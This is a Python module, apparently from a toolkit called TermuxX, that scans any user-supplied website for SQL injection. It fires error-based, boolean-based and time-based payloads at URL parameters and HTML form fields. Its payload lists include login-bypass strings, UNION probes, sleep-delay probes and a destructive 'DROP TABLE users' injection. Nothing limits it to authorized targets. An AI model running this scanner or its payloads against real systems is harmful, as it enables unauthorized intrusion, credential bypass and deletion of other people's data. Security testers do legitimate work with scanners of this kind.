# ============================================
# TermuxX v3.0 - SQL Injection Scanner
# Error-based, Boolean-based, Time-based SQLi
# Author: You
# ============================================

import re
import time
import urllib.parse
from core.colors import Colors
from core.web_engine import WebEngine


# SQL Error Signatures (Database-specific)
SQL_ERRORS = {
    "MySQL": [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "mysql_fetch",
        "mysql_num_rows",
        "mysql_query",
        "mysqli_",
        "MariaDB",
        "sql syntax.*mysql",
        "mysqlclient",
    ],
    "PostgreSQL": [
        "postgresql.*error",
        "warning.*pg_",
        "valid postgresql result",
        "npgsql",
        "pgsql",
        "org.postgresql",
        "psycopg2",
    ],
    "Microsoft SQL": [
        "driver.*sql server",
        "oledb.*sql server",
        "sq.*server.*driver",
        "warning.*mssql",
        "microsoft sql native client",
        "sqlserver",
        "System.Data.SqlClient",
        "unclosed quotation mark after the character",
    ],
    "Oracle": [
        "quoted string not properly terminated",
        "oracle.*driver",
        "warning.*oci_",
        "warning.*ora_",
        "oracle error",
        "ORA-[0-9]+",
    ],
    "SQLite": [
        "sqlite.*error",
        "warning.*sqlite",
        "unrecognized token",
        "sqlite3.OperationalError",
        "pdo_sqlite",
        "SQLITE_ERROR",
    ],
}

# SQL Injection Payloads
SQLI_PAYLOADS = {
    "error_based": [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1'/*",
        "\" OR \"1\"=\"1\" --",
        "1' ORDER BY 1--+",
        "1' ORDER BY 100--+",
        "1' UNION SELECT NULL--+",
        "1' UNION SELECT NULL,NULL--+",
        "1' UNION SELECT NULL,NULL,NULL--+",
        "' AND 1=1 --",
        "' AND 1=2 --",
        "admin'--",
        "admin' #",
        "') OR ('1'='1",
        "')) OR (('1'='1",
        "1 OR 1=1",
        "1' OR '1'='1",
        "' HAVING 1=1 --",
        "' GROUP BY 1 --",
        "1; DROP TABLE users --",
        "'; WAITFOR DELAY '0:0:5' --",
    ],
    "boolean_based": [
        "' AND 1=1 AND '1'='1",
        "' AND 1=2 AND '1'='1",
        "' OR 1=1 #",
        "' OR 1=2 #",
        "1 AND 1=1",
        "1 AND 1=2",
        "1 OR 1=1",
        "1 OR 1=2",
    ],
    "time_based": [
        "' OR SLEEP(5) --",
        "' OR SLEEP(5) #",
        "1' AND SLEEP(5) --",
        "'; WAITFOR DELAY '0:0:5' --",
        "' OR BENCHMARK(5000000,SHA1('test')) --",
        "1; WAITFOR DELAY '0:0:5' --",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
        (
            "' OR (SELECT COUNT(*) FROM "
            "generate_series(1,5000000)) --"
        ),
    ],
}


class SQLScanner:
    """
    Advanced SQL Injection Scanner
    Error, Boolean, aur Time-based detection
    """

    def __init__(self):
        self.web = WebEngine()
        self.target_url = None
        self.vulnerabilities = []
        self.scan_type = "all"
        self.test_forms = True

    def configure(self):
        """Settings"""
        print(Colors.info(
            "=== SQL INJECTION SCANNER ===\n"
        ))

        url = input(
            Colors.input_prompt("Target URL: ")
        ).strip()
        if not url:
            print(Colors.error("URL zaroori hai!"))
            return False
        self.target_url = self.web.normalize_url(url)

        print(Colors.info("\nScan Types:"))
        print("  1. Error-based SQLi")
        print("  2. Boolean-based Blind SQLi")
        print("  3. Time-based Blind SQLi")
        print("  4. ALL (Complete Scan)")

        scan = input(
            Colors.input_prompt(
                "Select scan type [1-4] (default 4): "
            )
        ).strip()
        scan_map = {
            "1": "error", "2": "boolean",
            "3": "time", "4": "all"
        }
        self.scan_type = scan_map.get(scan, "all")

        forms = input(
            Colors.input_prompt(
                "Test HTML forms? [Y/n]: "
            )
        ).strip().lower()
        self.test_forms = forms != 'n'

        return True

    def check_sql_errors(self, response_text):
        """Response mein SQL errors dhundhta hai"""
        found = []
        text_lower = response_text.lower()
        for db, errors in SQL_ERRORS.items():
            for error in errors:
                if re.search(error.lower(), text_lower):
                    found.append({
                        'database': db,
                        'error': error
                    })
        return found

    def test_error_based(self, url, param=None,
                          method="GET", data=None):
        """Error-based SQL injection test"""
        results = []
        payloads = SQLI_PAYLOADS["error_based"]

        # Get baseline response
        baseline = self.web.get(url)
        if not baseline:
            return results
        baseline_len = len(baseline.text)

        for payload in payloads:
            test_url = url
            test_data = None

            if param and method == "GET":
                separator = "&" if "?" in url else "?"
                test_url = (
                    f"{url}{separator}{param}="
                    f"{urllib.parse.quote(payload)}"
                )
            elif param and method == "POST":
                test_data = {param: payload}
                if data:
                    test_data.update(data)
            else:
                separator = "&" if "?" in url else "?"
                test_url = (
                    f"{url}{separator}id="
                    f"{urllib.parse.quote(payload)}"
                )

            if method == "POST":
                resp = self.web.post(test_url, test_data)
            else:
                resp = self.web.get(test_url)

            if resp:
                errors = self.check_sql_errors(resp.text)
                if errors:
                    vuln = {
                        'type': 'Error-based SQLi',
                        'severity': 'CRITICAL',
                        'url': test_url,
                        'payload': payload,
                        'param': param if param else 'URL',
                        'method': method,
                        'database': errors[0]['database'],
                        'error': errors[0]['error'],
                    }
                    results.append(vuln)
                    print(
                        f"  {Colors.RED}[CRITICAL]"
                        f"{Colors.RESET} "
                        f"Error-based SQLi - "
                        f"DB: {errors[0]['database']} "
                        f"- Payload: {payload[:40]}"
                    )

                # Response length difference
                resp_len = len(resp.text)
                diff = abs(resp_len - baseline_len)
                if diff > 500 and not errors:
                    print(
                        f"  {Colors.YELLOW}[SUSPICIOUS]"
                        f"{Colors.RESET} "
                        f"Response diff: {diff} bytes "
                        f"- Payload: {payload[:40]}"
                    )

        return results

    def test_boolean_based(self, url, param=None,
                            method="GET"):
        """Boolean-based Blind SQLi test"""
        results = []
        payloads = SQLI_PAYLOADS["boolean_based"]

        true_payloads = [p for p in payloads if "1=1" in p]
        false_payloads = [p for p in payloads if "1=2" in p]

        for tp, fp in zip(true_payloads, false_payloads):
            if param:
                sep = "&" if "?" in url else "?"
                true_url = (
                    f"{url}{sep}{param}="
                    f"{urllib.parse.quote(tp)}"
                )
                false_url = (
                    f"{url}{sep}{param}="
                    f"{urllib.parse.quote(fp)}"
                )
            else:
                sep = "&" if "?" in url else "?"
                true_url = (
                    f"{url}{sep}id="
                    f"{urllib.parse.quote(tp)}"
                )
                false_url = (
                    f"{url}{sep}id="
                    f"{urllib.parse.quote(fp)}"
                )

            true_resp = self.web.get(true_url)
            false_resp = self.web.get(false_url)

            if true_resp and false_resp:
                if len(true_resp.text) != len(false_resp.text):
                    diff = abs(
                        len(true_resp.text) -
                        len(false_resp.text)
                    )
                    if diff > 50:
                        vuln = {
                            'type': 'Boolean-based Blind SQLi',
                            'severity': 'HIGH',
                            'url': url,
                            'payload': f"TRUE: {tp} | FALSE: {fp}",
                            'param': param if param else 'URL',
                            'method': method,
                            'diff': diff
                        }
                        results.append(vuln)
                        print(
                            f"  {Colors.RED}[HIGH]"
                            f"{Colors.RESET} "
                            f"Boolean Blind SQLi - "
                            f"Diff: {diff} bytes"
                        )

        return results

    def test_time_based(self, url, param=None,
                         method="GET"):
        """Time-based Blind SQLi test"""
        results = []
        payloads = SQLI_PAYLOADS["time_based"]

        # Baseline response time
        start = time.time()
        self.web.get(url)
        baseline_time = time.time() - start

        for payload in payloads:
            if param:
                sep = "&" if "?" in url else "?"
                test_url = (
                    f"{url}{sep}{param}="
                    f"{urllib.parse.quote(payload)}"
                )
            else:
                sep = "&" if "?" in url else "?"
                test_url = (
                    f"{url}{sep}id="
                    f"{urllib.parse.quote(payload)}"
                )

            start = time.time()
            resp = self.web.get(test_url)
            elapsed = time.time() - start

            if elapsed > (baseline_time + 4):
                vuln = {
                    'type': 'Time-based Blind SQLi',
                    'severity': 'HIGH',
                    'url': test_url,
                    'payload': payload,
                    'param': param if param else 'URL',
                    'method': method,
                    'delay': round(elapsed, 2)
                }
                results.append(vuln)
                print(
                    f"  {Colors.RED}[HIGH]{Colors.RESET} "
                    f"Time-based SQLi - "
                    f"Delay: {round(elapsed,2)}s "
                    f"- Payload: {payload[:40]}"
                )

        return results

    def scan_forms(self, url):
        """HTML forms ko test karta hai"""
        forms = self.web.extract_forms(url)
        if not forms:
            print(Colors.info("No forms found on page"))
            return

        print(Colors.info(
            f"\nFound {len(forms)} form(s). Testing..."
        ))

        for i, form in enumerate(forms):
            print(Colors.info(
                f"\nForm #{i+1}: "
                f"Action={form['action']} "
                f"Method={form['method']}"
            ))

            for inp in form['inputs']:
                if inp['type'] in [
                    'text', 'search', 'email',
                    'password', 'textarea', 'hidden'
                ]:
                    print(Colors.info(
                        f"  Testing param: {inp['name']}"
                    ))

                    full_action = form['action']
                    if not full_action.startswith("http"):
                        full_action = (
                            url.rstrip('/') + '/' +
                            full_action.lstrip('/')
                        )

                    if self.scan_type in ["error", "all"]:
                        self.test_error_based(
                            full_action, inp['name'],
                            form['method']
                        )
                    if self.scan_type in ["boolean", "all"]:
                        self.test_boolean_based(
                            full_action, inp['name'],
                            form['method']
                        )
                    if self.scan_type in ["time", "all"]:
                        self.test_time_based(
                            full_action, inp['name'],
                            form['method']
                        )

    def run(self):
        """Scanner start"""
        if not self.configure():
            return

        print(Colors.info(
            f"\nTarget: {self.target_url}"
        ))
        print(Colors.info(
            f"Scan Type: {self.scan_type.upper()}"
        ))
        print(Colors.info("=" * 60))

        # URL parameter testing
        print(Colors.info(
            "\n[Phase 1] Testing URL parameters..."
        ))

        if self.scan_type in ["error", "all"]:
            print(Colors.info(
                "\n--- Error-based SQLi ---"
            ))
            vulns = self.test_error_based(
                self.target_url
            )
            self.vulnerabilities.extend(vulns)

        if self.scan_type in ["boolean", "all"]:
            print(Colors.info(
                "\n--- Boolean-based Blind SQLi ---"
            ))
            vulns = self.test_boolean_based(
                self.target_url
            )
            self.vulnerabilities.extend(vulns)

        if self.scan_type in ["time", "all"]:
            print(Colors.info(
                "\n--- Time-based Blind SQLi ---"
            ))
            vulns = self.test_time_based(
                self.target_url
            )
            self.vulnerabilities.extend(vulns)

        # Form testing
        if self.test_forms:
            print(Colors.info(
                "\n[Phase 2] Testing HTML Forms..."
            ))
            self.scan_forms(self.target_url)

        # Report
        print(Colors.info("\n" + "=" * 60))
        print(Colors.info("SQL INJECTION SCAN REPORT"))
        print(Colors.info("=" * 60))

        if self.vulnerabilities:
            print(Colors.error(
                f"\n⚠️  {len(self.vulnerabilities)} "
                f"VULNERABILITIES FOUND!\n"
            ))
            for v in self.vulnerabilities:
                sev_color = Colors.RED
                if v['severity'] == 'HIGH':
                    sev_color = Colors.YELLOW
                print(
                    f"  {sev_color}[{v['severity']}]"
                    f"{Colors.RESET} {v['type']}"
                )
                print(f"    Param: {v.get('param','N/A')}")
                payload_str = v.get('payload', 'N/A')
                print(f"    Payload: {payload_str[:60]}")
                if 'database' in v:
                    print(f"    Database: {v['database']}")
                print()
        else:
            print(Colors.success(
                "\n✅ No SQL injection "
                "vulnerabilities detected."
            ))


def run():
    scanner = SQLScanner()
    scanner.run()
